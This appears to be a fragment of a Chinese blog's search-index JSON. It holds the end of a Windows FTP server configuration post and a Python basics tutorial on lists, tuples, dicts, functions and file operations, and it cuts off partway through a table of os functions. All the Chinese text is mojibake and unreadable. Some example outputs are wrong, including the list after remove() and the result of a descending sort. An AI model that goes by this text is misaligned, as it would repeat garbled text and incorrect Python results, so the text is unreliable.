å…è®¸è§„åˆ™ï¼Œå¯ä»¥è®¾å®šæˆæƒè§„åˆ™\nä¾‹å¦‚ï¼šæˆ‘ä»¬å¯ä»¥è®¾åŒ¿åç”¨æˆ·åªèƒ½è¯»å–ï¼ŒæŒ‡å®šç”¨æˆ·å¯ä»¥è¯»å–å’Œå†™å…¥ç­‰ç­‰æ“ä½œ\n\n<img src=\"https://i.loli.net/2020/03/24/gG6TvA8xNCPzwmn.png\"/>\n\n#### 4.4 è¯·æ±‚ç­›é€‰\n\næ‰“å¼€FTPè¯·æ±‚ç­›é€‰ï¼Œå¯ä»¥è®¾ç½®æ‹’ç»æ”¾å…¥æˆ–è€…ä¸Šä¼ çš„æ–‡ä»¶æ‰©å±•åç­‰ç­‰æ“ä½œ\n\n<img src=\"https://i.loli.net/2020/03/24/7gWYcTVIwOznmha.png\"/>\n\n\n\nâ€‹          \n","tags":["FTPæœåŠ¡å™¨","WindowsæœåŠ¡å™¨é…ç½®ä¸ç®¡ç†"],"categories":["Course"]},{"title":"Pythonï¼šåŸºç¡€&çˆ¬è™«","url":"/posts/34992.html","content":"\n<center><font color=pink size=8>Pythonçˆ¬è™«å­¦ä¹ </font></center>\n\n## å‰è¨€\n\nçˆ¬è™«å­¦ä¹ æš‚æ—¶å’•å’•äº†ã€‚ã€‚ã€‚ï¼Œç­‰æœ‰ç©ºå†ç»§ç»­æ›´æ–°\n\n## ä¸€ã€åŸºç¡€çŸ¥è¯†å‡†å¤‡\n\n> PythonåŸºç¡€è¯­æ³•è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œæˆ‘é€šè¿‡ä¸€ä¸ªä¸ªç®€å•çš„å°æ®µä»£ç æ¥è¿›è¡Œå­¦ä¹ ï¼Œæ‰€éœ€æŒæ¡çš„çŸ¥è¯†ç‚¹éƒ½åŒ…å«åœ¨è¿™æ®µæ®µä»£ç ä¸­ï¼Œæ¯æ®µä»£ç éƒ½æœ‰ç›¸åº”è¯¦ç»†æ³¨é‡Šï¼Œå¦‚æœä½ æœ‰å…¶ä»–è¯­è¨€çš„åŸºç¡€é‚£ä¹ˆPythonåŸºç¡€å°±æ˜¯è½»è½»æ¾æ¾çš„äº‹ã€‚\n\n### 1 æ¡ä»¶åˆ¤æ–­è¯­å¥\n\n```python\nscore = 60\nif score >=90 and score <=100:\n    print(\"æœ¬æ¬¡è€ƒè¯•ç­‰çº§ä¸ºA\")\nelif score >=70 and score <90:  #elif == else if\n    print(\"æœ¬æ¬¡è€ƒè¯•ç­‰çº§ä¸ºB\")      \nelse:\n    print(\"æœ¬æ¬¡è€ƒè¯•ç­‰çº§ä¸ºC\")      #output: æœ¬æ¬¡è€ƒè¯•ç­‰çº§ä¸ºC\n```\n\n### 2 å¾ªç¯è¯­å¥\n\n#### 2.1 forå¾ªç¯\n\n```python\nfor i in range(5): #è¾“å‡º5ä¸ªæ•° [0 1 2 3 4]\n    print(i)\n\nfor i in range(0,10,3):#ä»[0,10)ï¼Œä»¥3ä¸ºé—´è·è¾“å‡º                #output: [0 3 6 9]\n    print(i)\n\n\nfor i in range(-10,-100,-30):#ä»[-10ï¼Œ-100)ï¼Œä»¥-30ä¸ºé—´è·     #output: [-10 -40 -70]\n    print(i)\n\n\n\nname=\"chengdu\" \nfor x in name:\n    print(x)            #output: [c h e n g d u]\n\n    \na = [\"a\", \"b\", \"c\"] \nfor i in range(len(a)):\n     print(i, a[i])    #output: [0 a 1 b 2 c]\n```\n\n####  2.2 whileå¾ªç¯\n\n```python\ni=0\nwhile i<3:\n    print(\"è¿™æ˜¯ç¬¬%dæ¬¡å¾ªç¯ï¼š\"%(i+1))\n    print(\"i=%d\"%i)\n    i+=1\n\n'''#output: \nè¿™æ˜¯ç¬¬1æ¬¡å¾ªç¯ï¼š\ni=0\nè¿™æ˜¯ç¬¬2æ¬¡å¾ªç¯ï¼š\ni=1\nè¿™æ˜¯ç¬¬3æ¬¡å¾ªç¯ï¼š\ni=2\n'''\n```\n\n```python\ncount = 0\nwhile count<3:\n    print(count,\"å°äº3\")\n    count +=1\nelse:\n    print(count,\"å¤§äºæˆ–ç­‰äº3\")\n    \n'''#output: \n0 å°äº3\n1 å°äº3\n2 å°äº3\n3 å¤§äºæˆ–ç­‰äº3\n'''\n```\n### 3 å­—ç¬¦ä¸²\n\n```python\nstr=\"chengdu\"\t\t\t  \nprint(str)                #chengdu\nprint(str[0])             #c\nprint(str[0:5])           #[0,5) cheng\nprint(str[1:7:2])         #[èµ·å§‹ä½ç½®ï¼šç»“æŸä½ç½®ï¼šæ­¥è¿›å€¼] hnd\nprint(str[5:])            #æ˜¾ç¤º5ä»¥åçš„ du\nprint(str[:5])            #æ˜¾ç¤º5ä»¥å‰çš„ cheng\nprint(str+\",hello\")       #å­—ç¬¦ä¸²è¿æ¥ chengdu,hello\nprint(str*3)              #æ‰“å°3æ¬¡ chengduchengduchengdu\nprint(\"hello\\nchengdu\")   #\\næ¢è¡Œ hello  chengdu\nprint(r\"hello\\nchengdu\")  #å‰é¢åŠ \"r\"ï¼Œè¡¨ç¤ºæ˜¾ç¤ºåŸå§‹å­—ç¬¦ä¸²ï¼Œä¸è¿›è¡Œè½¬ä¹‰hello\\nchengdu\nprint(\"-\"*30)             #æ‰“å°30ä¸ªâ€œ-â€\n```\n\n### 4 åˆ—è¡¨-List\n\n> åˆ—è¡¨ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½åˆ†é…ä¸€ä¸ªæ•°å­— - å®ƒçš„ä½ç½®æˆ–ç´¢å¼•ï¼Œç¬¬ä¸€ä¸ªç´¢å¼•æ˜¯0ï¼Œç¬¬äºŒä¸ªç´¢å¼•æ˜¯1ï¼Œä¾æ­¤ç±»æ¨ã€‚\n#### 4.1 åˆ—è¡¨å®šä¹‰\n```python\nnamelist = [\"å°å¼ \",\"å°ç‹\",\"å°æ\"]\ntestlist = [1,\"æµ‹è¯•\",\"str\"]  #åˆ—è¡¨ä¸­å¯ä»¥å­˜å‚¨æ··åˆç±»å‹\ntestlist = [[\"a\",\"b\"],[\"c\",\"d\"],[\"e\",\"f\",\"g\"]] #åˆ—è¡¨åµŒå¥—\n```\n#### 4.2 åˆ—è¡¨å…ƒç´ è¾“å‡º\n\n```python\nnamelist = [\"å°å¼ \",\"å°ç‹\",\"å°æ\"]\n#è¾“å‡ºæŒ‡å®šå…ƒç´ \nprint(namelist[1])     #output: å°ç‹\n\n#éå†è¾“å‡º\nfor name in namelist: \n    print(name)\n   \n'''output\nå°å¼ \nå°ç‹\nå°æ\n'''    \n\n#ä½¿ç”¨æšä¸¾å‡½æ•°enenumerate()ï¼ŒåŒæ—¶æ‹¿åˆ°åˆ—è¡¨ä¸‹æ ‡å’Œå…ƒç´ ç±»å®¹\nfor i,name in enumerate(namelist): \n    print(i,name)\n    \n'''output\n0 å°å¼ \n1 å°ç‹\n2 å°æ\n'''\n```\n#### 4.3 åˆ—è¡¨å…ƒç´ åˆ‡ç‰‡\n\nå¦‚ä¸‹æ‰€ç¤ºï¼šL=['Google', 'Python', 'Taobao']\n\n| Python | è¡¨è¾¾å¼ ç»“æœ          | æè¿°                               |\n| :----- | :------------------- | ---------------------------------- |\n| L[2]   | 'Taobao'             | è¯»å–ç¬¬ä¸‰ä¸ªå…ƒç´                      |\n| L[-1]  | 'Taobao'             | è¯»å–æœ€åä¸€ä¸ªå…ƒç´                    |\n| L[1:]  | ['Python', 'Taobao'] | è¾“å‡ºä»ç¬¬äºŒä¸ªå…ƒç´ å¼€å§‹åçš„æ‰€æœ‰å…ƒç´    |\n| L[:-1] | ['Google', 'Python'] | è¾“å‡ºä»ç¬¬ä¸€ä¸ªåˆ°å€’æ•°ç¬¬ä¸€ä¸ªçš„æ‰€æœ‰å…ƒç´  |\n| L[-2:] | ['Python', 'Taobao'] | è¾“å‡ºä»å€’æ•°ç¬¬äºŒä¸ªåˆ°æœ«å°¾çš„æ‰€æœ‰å…ƒç´    |\n\n#### 4.4 åˆ—è¡¨å…ƒç´ è¿½åŠ \n\n```python\n#append\na = [1,2]\nb = [3,4]\na.append(b)  #å°†båˆ—è¡¨å½“åšä¸€ä¸ªå…ƒç´ åŠ å…¥åˆ°aä¸­\nprint(a)     #output: [1, 2, [3, 4]]\n\n#extend\na = [1,2]\nb = [3,4]\na.extend(b) #å°†båˆ—è¡¨ä¸­çš„è¯¶ä¸ªå…ƒç´ ï¼Œé€ä¸€è¿½åŠ åˆ°aä¸­\nprint(a)    #output: [1, 2, 3, 4]\n\n#insert\na=[1,2,4]\na.insert(2,3) ##åœ¨ä¸‹æ ‡ä¸º2çš„ä½ç½®æ’å…¥3   #æŒ‡å®šä¸‹æ ‡ä½ç½®æ’å…¥å…ƒç´ ï¼ˆç¬¬ä¸€ä¸ªè¡¨ç¤ºä¸‹æ ‡ï¼Œç¬¬äºŒä¸ªè¡¨ç¤ºå…ƒç´ ï¼‰\nprint(a)  #output: [1, 2, 3, 4] \n```\n#### 4.5 åˆ—è¡¨å…ƒç´ åˆ é™¤\n\n```python\n#del\na = [\"å°å¼ \",\"å°ç‹\",\"å°æ\"]\ndel a[2]                      #åˆ é™¤æŒ‡å®šä¸‹æ ‡å…ƒç´ \nprint(a)                      #output: ['å°å¼ ', 'å°ç‹']\n\n#pop\na = [\"å°å¼ \",\"å°ç‹\",\"å°æ\"]\na.pop()                      #å¼¹å‡ºæœ«å°¾å…ƒç´ \nprint(a)                     #output: ['å°å¼ ', 'å°ç‹']\n\n#remove\na = [\"å°å¼ \",\"å°ç‹\",\"å°æ\"]\na.remove(\"å°æ\")             #ç›´æ¥åˆ é™¤æŒ‡å®šå†…å®¹çš„å…ƒç´ \nprint(a)                    #output: ['å°å¼ ', 'å°æ']\n```\n#### 4.6 åˆ—è¡¨å…ƒç´ ä¿®æ”¹\n\n```python\na = [\"å°å¼ \",\"å°ç‹\",\"å°æ\"]\na[2] = \"å°çº¢\"\t\t\t\t #ä¿®æ”¹æŒ‡å®šä¸‹æ ‡å…ƒç´ å†…å®¹\nprint(a) \t\t\t\t  #output: ['å°å¼ ', 'å°ç‹', 'å°çº¢']\n```\n\n#### 4.7 åˆ—è¡¨å…ƒç´ æŸ¥æ‰¾\n\n```python\n#in / not in\na = [\"å°å¼ \",\"å°ç‹\",\"å°æ\"]\nfindName = input(\"è¯·è¾“å…¥ä½ è¦æŸ¥æ‰¾çš„å­¦ç”Ÿå§“åï¼š\")\nif findName in a:\n    print(\"æ‰¾åˆ°\")\nelse:\n    print(\"æœªæ‰¾åˆ°\")\n    \n#index\na = [\"å°å¼ \",\"å°ç‹\",\"å°æ\"]\nprint(a.index(\"å°ç‹\",0,2))    #å¯ä»¥æŸ¥æ‰¾æŒ‡å®šä¸‹æ ‡èŒƒå›´çš„å…ƒç´ ï¼Œå¹¶è¿”å›æ‰¾åˆ°å¯¹åº”æ•°æ®çš„ä¸‹æ ‡  #output: 1\nprint(a.index(\"å°æ\",0,2))   #èŒƒå›´åŒºé—´ï¼šå·¦å¼€å³é—­[0,2) # ValueError: 'å°æ' is not in list\n\n#count\nprint(a.count(\"å°ç‹\"))      #æŸ¥æ‰¾æŸä¸ªå…ƒç´ å‡ºç°çš„æ¬¡æ•°  #output: 1\n```\n\n#### 4.8 åˆ—è¡¨å…ƒç´ åè½¬å’Œæ’åº\n\n```python\na = [1,4,2,3]\na.reverse()             #å°†åˆ—è¡¨æ‰€æœ‰å…ƒç´ åè½¬\nprint(a)                #output: [3, 2, 4, 1]\n \na.sort()                #å‡åº\nprint(a)                #output: [1, 2, 3, 4]\n\na.sort(reverse=True)    #é™åº\nprint(a)                #output: [1, 2, 3, 4]\n```\n### 5 å‰æ®µçŸ¥è¯†ç»¼åˆç»ƒä¹ \n\n> Topic:  å°†8ä¸ªè€å¸ˆéšæœºåˆ†é…åˆ°3ä¸ªåŠå…¬å®¤\n\n```python\nimport random\noffices = [[],[],[]]\t\t\t\t\t\t\t#3ä¸ªæ•™å®¤\nteachers = [\"A\",\"B\",\"C\",\"D\",\"E\",\"F\",\"G\",\"H\"]\t#8ä¸ªè€å¸ˆ\nfor teacher in teachers:                 \t\t#éå†teachersæ”¾å…¥officeä¸­\n    index = random.randint(0,2)   \t\t \t\t#äº§ç”Ÿéšæœºæ•°0,1,2\n    offices[index].append(teacher)     \t\t    #å°†teachersè¿½åŠ åˆ°officeä¸­\ni=1 #office1\nfor office in offices:                \t\t\t #è¾“å‡ºæ¯ä¸ªofficeäººæ•°å’Œå¯¹åº”çš„è€å¸ˆ\n    print(\"office%dçš„äººæ•°ä¸ºï¼š%d\"%(i,len(office)))\n    i += 1  #éå†offices\n    for name in office:\n        print(\"%s\"%name,end=\"\\t\")    \t\t\t #æ‰“å°æ¯ä¸ªofficeè€å¸ˆçš„åå­—\n    print(\"\\n\")                       \t\t\t #æ‰“å°å®Œä¸€ä¸ªofficeæ¢è¡Œ\n    print(\"-\"*20)                    \t\t\t #æ‰“å°å®Œä¸€ä¸ªofficeè¾“å‡º20ä¸ª-\n```\n###  6 å…ƒç»„-Tuple\n\n> å…ƒç»„ä¸åˆ—è¡¨ç±»ä¼¼ï¼Œä¸åŒä¹‹å¤„åœ¨äºå…ƒç»„çš„å…ƒç´ ä¸èƒ½ä¿®æ”¹ã€‚\n> å…ƒç»„ä½¿ç”¨å°æ‹¬å·ï¼Œåˆ—è¡¨ä½¿ç”¨æ–¹æ‹¬å·ã€‚\n\n#### 6.1 å…ƒç»„å®šä¹‰\n\n```python\ntup1=()     #ç©ºå…ƒç»„\ntup2=(5)    #<class 'int'>  ä¸æ˜¯å…ƒç»„\ntup2=(5,)   #<class 'tuple'>\ntup3 = ('Google', 'Python', 1997, 2000)\n```\n#### 6.2 å…ƒç»„å…ƒç´ åˆ‡ç‰‡\n\n```python\ntup=(1,2,3)\nprint(tup[0])    #ç¬¬ä¸€ä¸ªå…ƒç´      #output:  1\nprint(tup[-1])   #æœ€åä¸€ä¸ªå…ƒç´    #output:  3\nprint(tup[0:2])  #å·¦é—­å³å¼€[0,2) #output:  (1, 2)\n```\n####  6.3 å…ƒç»„å…ƒç´ å¢åŠ (è¿æ¥)\n\n```python\ntup1 = (12,34,56)\ntup2 = (\"ab\",\"cd\",\"ef\")\ntup3 = tup1+tup2\nprint(tup3)          #(12, 34, 56, 'ab', 'cd', 'ef')\n```\n#### 6.4 å…ƒç»„å…ƒç´ åˆ é™¤\n\n```python\ntup1 = (12,34,56)\n#del tup1[0]    #ä¸å…è®¸åˆ é™¤å•ä¸ªå…ƒç´ \ndel tup1        #åˆ é™¤äº†æ•´ä¸ªå…ƒç»„å˜é‡\n```\n#### 6.5 å…ƒç»„å…ƒç´ ä¸èƒ½ä¿®æ”¹\n\n```python\ntup1 = (12,34,56)\ntup1[0] = 72  #æŠ¥é”™ ä¸èƒ½ä¿®æ”¹\n```\n\n### 7 å­—å…¸-dict\n\n>å­—å…¸ä½¿ç”¨é”®å€¼å¯¹(key=>value)å­˜å‚¨ï¼›é”®å¿…é¡»æ˜¯å”¯ä¸€çš„ï¼Œä½†å€¼åˆ™ä¸å¿…ã€‚\n\n#### 7.1 å­—å…¸å®šä¹‰\n\n```python\ndict = {key1 : value1, key2 : value2 }\ninfo = {\"name\":\"ç®€ç®€\",\"age\":18}\n```\n#### 7.2 å­—å…¸è®¿é—®\n\n```python\ninfo = {\"name\":\"ç®€ç®€\",\"age\":18}\nprint(info[\"name\"])\nprint(info[\"age\"])\n\n#è®¿é—®ä¸å­˜åœ¨é”®\nprint(info[\"sex\"])               #ç›´æ¥è®¿é—®ä¸å­˜åœ¨çš„é”®ï¼Œä¼šæŠ¥é”™\nprint(info.get(\"sex\"))           #ä½¿ç”¨get()æ–¹æ³•ï¼Œè®¿é—®ä¸å­˜åœ¨çš„é”®ï¼Œé»˜è®¤è¿”å›ï¼šnone\nprint(info.get(\"sex\",\"æ²¡æœ‰\"))     #æ²¡æœ‰æ‰¾åˆ°çš„æ—¶å€™ï¼Œè¿”å›è‡ªå®šä¹‰å€¼  #outputï¼š æ²¡æœ‰\n```\n#### 7.3 å­—å…¸é”®å€¼å¢åŠ \n\n```python\ninfo = {\"name\":\"ç®€ç®€\",\"age\":18}\ninfo[\"sex\"]=\"man\"   \t\t\t#æ–°å¢sex\nprint(info)         \t\t\t#output: {'name': 'ç®€ç®€', 'age': 18, 'sex': 'man'}\n```\n#### 7.4 å­—å…¸é”®å€¼åˆ é™¤\n\n```python\n#del\ninfo = {\"name\":\"ç®€ç®€\",\"age\":18}\ndel info[\"name\"]                #åˆ é™¤nameé”®å€¼å¯¹\nprint(info)                     #output: {'age': 18}\n\ndel info                        #åˆ é™¤æ•´ä¸ªå­—å…¸\nprint(info)                     #output: NameError: name 'info' is not defined\n\n#clear\ninfo = {\"name\":\"ç®€ç®€\",\"age\":18}\ninfo.clear()                     #æ¸…ç©ºå­—å…¸å†…é”®å€¼å¯¹\nprint(info)                      #output: {}\n```\n#### 7.5 å­—å…¸é”®å€¼ä¿®æ”¹\n\n```python\ninfo = {\"name\":\"ç®€ç®€\",\"age\":18}\ninfo[\"age\"]=20\nprint(info)\n```\n#### 7.6 å­—å…¸é”®å€¼æŸ¥æ‰¾\n\n```python\ninfo = {\"name\":\"ç®€ç®€\",\"age\":18}\nprint(info.keys())               #å¾—åˆ°æ‰€æœ‰çš„é”®     #output: dict_keys(['name', 'age'])\nprint(info.values())             #å¾—åˆ°æ‰€æœ‰çš„å€¼     #output: dict_values(['ç®€ç®€', 18])\nprint(info.items())     \t\t #å¾—åˆ°æ‰€æœ‰çš„é”®å€¼å¯¹ #output: dict_items([('name', 'ç®€ç®€'), ('age', 18)])\n\n\n#éå†æ‰€æœ‰çš„é”®\nfor key in info.keys():\n    print(key)     #output: name age\n    \n#éå†æ‰€æœ‰çš„å€¼\nfor value in info.values():\n    print(value)     #output: ç®€ç®€ 18\n    \n#éå†æ‰€æœ‰çš„é”®å€¼å¯¹\nfor key,value in info.items():\n        print(\"(key=%s,value=%s)\"%(key,value)) \n#output: (key=name,value=ç®€ç®€) (key=age,value=18)\n```\n\n### 8 å‡½æ•°\n\n#### 8.1 å‡½æ•°å®šä¹‰å’Œä½¿ç”¨\n\n```python\ndef printinfo(a,b): #å‡½æ•°å®šä¹‰\n    c =a + b\n    print(c)\n\nprintinfo(1,2) \t\t#å‡½æ•°çš„ä½¿ç”¨\n```\n\n#### 8.2 å¸¦è¿”å›å€¼çš„å‡½æ•°\n\n```python\ndef info(a,b):\n    c =a + b\n    return c \t\t#è¿”å›å€¼\n\nprint(info(1,2)) \n```\n\n#### 8.3 è¿”å›å¤šä¸ªå€¼çš„å‡½æ•°\n\n```python\ndef divid(a,b):\n    shang = a//b\n    yushu = a%b\n    return shang,yushu #å¤šä¸ªè¿”å›å€¼ç”¨é€—å·éš”å¼€\n\nsh,yu = divid(5,2)     #éœ€è¦ç”¨å¤šä¸ªå€¼æ¥ä¿å­˜è¿”å›å†…å®¹\nprint(\"å•†ï¼š%d ä½™æ•°:%d\"%(sh,yu))\n```\n\n### 9 æ–‡ä»¶æ“ä½œ\n\n#### 9.1 æ‰“å¼€æ–‡ä»¶(open)\n\nç”¨æ³•ï¼šå¯¹è±¡=open(æ–‡ä»¶åï¼Œè®¿é—®æ¨¡å¼)\n\n```python\nf = open('test.txt', 'w')\n```\n| æ¨¡å¼   | è¯´æ˜                                                         |\n| ------ | ------------------------------------------------------------ |\n| **r**  | ä»¥åªè¯»æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚æ–‡ä»¶çš„æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚è¿™æ˜¯é»˜è®¤æ¨¡å¼ã€‚ |\n| **w**  | æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶åªç”¨äºå†™å…¥ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™å°†å…¶è¦†ç›–ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ã€‚ |\n| a      | æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¿½åŠ ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ–°çš„å†…å®¹å°†ä¼šè¢«å†™å…¥åˆ°å·²æœ‰å†…å®¹ä¹‹åã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶è¿›è¡Œå†™å…¥ã€‚ |\n| **rb** | ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºåªè¯»ã€‚æ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚è¿™æ˜¯é»˜è®¤æ¨¡å¼ã€‚ |\n| **wb** | ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶åªç”¨äºå†™å…¥ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™å°†å…¶è¦†ç›–ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ã€‚ |\n| ab     | ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¿½åŠ ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ–°çš„å†…å®¹å°†ä¼šè¢«å†™å…¥åˆ°å·²æœ‰å†…å®¹ä¹‹åã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶è¿›è¡Œå†™å…¥ã€‚ |\n| r+     | æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚æ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚           |\n| w+     | æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™å°†å…¶è¦†ç›–ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ã€‚ |\n| a+     | æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚æ–‡ä»¶æ‰“å¼€æ—¶ä¼šæ˜¯è¿½åŠ æ¨¡å¼ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ç”¨äºè¯»å†™ã€‚ |\n| rb+    | ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚æ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚ |\n| wb+    | ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™å°†å…¶è¦†ç›–ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ã€‚ |\n| ab+    | ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¿½åŠ ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ç”¨äºè¯»å†™ã€‚ |\n\n\n#### 9.2 å…³é—­æ–‡ä»¶(close)\n\nç”¨æ³•ï¼šå¯¹è±¡.close()\n\n```python\nf.close()\n```\n#### 9.3 å†™æ•°æ®(write)\n\nç”¨æ³•ï¼šå¯¹è±¡.write()\n```python\nf=open(\"test.txt\",\"w\")  # æ‰“å¼€æ–‡ä»¶ï¼Œw(å†™æ¨¡å¼)-æ–‡ä»¶ä¸å­˜åœ¨å°±åœ¨å½“å‰è·¯å¾„ç»™ä½ æ–°å»ºä¸€ä¸ª\nf.write(\"hello,world\")  # writeå°†å­—ç¬¦å†™å…¥æ–‡ä»¶\nf.close()\n```\n#### 9.4 è¯»æ•°æ®(read)\n\nç”¨æ³•ï¼šå¯¹è±¡.read()\n\n```python\nf=open(\"test.txt\",\"r\")   #æ‰“å¼€æ–‡ä»¶ï¼Œr(è¯»æ¨¡å¼)\ncontent=f.read(5)        #readè¯»å–5ä¸ªå­—ç¬¦\nprint(content)\nf.close()\n```\n\n#### 9.5 è¯»ä¸€è¡Œæ•°æ®(readline)\n\nç”¨æ³•ï¼šå¯¹è±¡.readline()\n\n```python\nf = open('test.txt', 'r')\ncontent = f.readline()\nprint(\"1:%s\"%content)#è¯»å–ä¸€è¡Œ\ncontent = f.readline()\nprint(\"2:%s\"%content)#å†è¯»ä¸‹ä¸€è¡Œ\nf.close()\n```\n\n#### 9.6 è¯»å¤šè¡Œæ•°æ®(readlines)\n\nç”¨æ³•ï¼šå¯¹è±¡.readlines()\n\n```python\nf=open(\"test.txt\",\"r\")   #æ‰“å¼€æ–‡ä»¶ï¼Œr(è¯»æ¨¡å¼)\ncontent=f.readlines()    #readlinesè¯»å–æ•´ä¸ªæ–‡ä»¶ï¼Œä»¥åˆ—è¡¨å½¢å¼è¾“å‡º\nprint(content)           #è¾“å‡ºå½¢å¼ä¸ºåˆ—è¡¨ #output: ['hello,world\\n', 'hello,world']\n\n#å¯¹åˆ—è¡¨è¿›è¡Œå¤„ç†ï¼ŒæŒ‰åºå·ä¸€è¡Œä¸€è¡Œè¾“å‡º\ni=1\nfor temp in content:\n    print(\"%d:%s\" % (i, temp))\n    i += 1  #output: 1:hello,world 2:hello,world\nf.close() \n```\n\n#### 9.7 OSæ¨¡å—\n\n- ä½¿ç”¨è¯¥æ¨¡å—å¿…é¡»å…ˆå¯¼å…¥æ¨¡å—ï¼š\n\n```\n    import os\n```\n\n##### osæ¨¡å—ä¸­çš„å‡½æ•°:\n\n| åºå· | å‡½æ•°åç§°     | æè¿°                                          | æ ¼å¼                                                         |\n| ---- | ------------ | --------------------------------------------- | ------------------------------------------------------------ |\n| 1    | getcwd()     | è·å–å½“å‰çš„å·¥ä½œç›®å½•                            | æ ¼å¼ï¼šos.getcwd() è¿”å›å€¼ï¼šè·¯å¾„å­—ç¬¦ä¸²                         |\n| 2    | chdir()      | ä¿®æ”¹å½“å‰å·¥ä½œç›®å½•                              | æ ¼å¼:os.chdir() è¿”å›å€¼:None                                  |\n| 3    | listdir()    | è·å–æŒ‡å®šæ–‡ä»¶å¤¹ä¸­çš„ æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ç»„æˆçš„åˆ—è¡¨ | æ ¼å¼:os.listdir(ç›®å½•è·¯å¾„) è¿”å›å€¼ï¼šç›®å½•ä¸­å†…å®¹åç§°çš„åˆ—è¡¨       |\n| 4    | mkdir()      | åˆ›å»ºä¸€ä¸ªç›®å½•/æ–‡ä»¶å¤¹                           | æ ¼å¼ï¼šos.mkdir(ç›®å½•è·¯å¾„) è¿”å›å€¼ï¼šNone                        |\n| 5    | makedirs()   | é€’å½’åˆ›å»ºæ–‡ä»¶å¤¹                                | æ ¼å¼:os.makedirs(è·¯å¾„)                                       |\n| 6    | rmdir()      | ç§»é™¤ä¸€ä¸ªç›®å½•ï¼ˆå¿…é¡»æ˜¯ç©ºç›®å½•ï¼‰                  | æ ¼å¼ï¼šos.rmdir(ç›®å½•è·¯å¾„) è¿”å›å€¼:None                         |\n| 7    | removedirs() | é€’å½’åˆ é™¤æ–‡ä»¶å¤¹                                | æ ¼å¼ï¼šos.removedirs(ç›®å½•è·¯å¾„) è¿”å›å€¼ï¼šNone æ³¨æ„æœ€åº•å±‚ç›®å½•å¿…é¡»ä¸ºç©º |\n| 8    | rename()     | ä¿®æ”¹æ–‡ä»¶å’Œæ–‡ä»¶å¤¹çš„åç§°                        | æ ¼å¼ï¼šos.rename(æºæ–‡ä»¶æˆ–æ–‡ä»¶å¤¹ï¼Œç›®æ ‡æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹) è¿”å›å€¼ï¼šNone |\n| 9    | stat()       | è·å–æ–‡ä»¶çš„ç›¸å…³ ä¿¡æ¯                           | æ ¼å¼ï¼šos.stat(æ–‡ä»¶è·¯å¾„) è¿”å›å€¼ï¼šåŒ…å«æ–‡ä»¶ä¿¡æ¯çš„å…ƒç»„           |\n| 10   | system()     | æ‰§è¡Œç³»ç»Ÿå‘½ä»¤                                  | æ 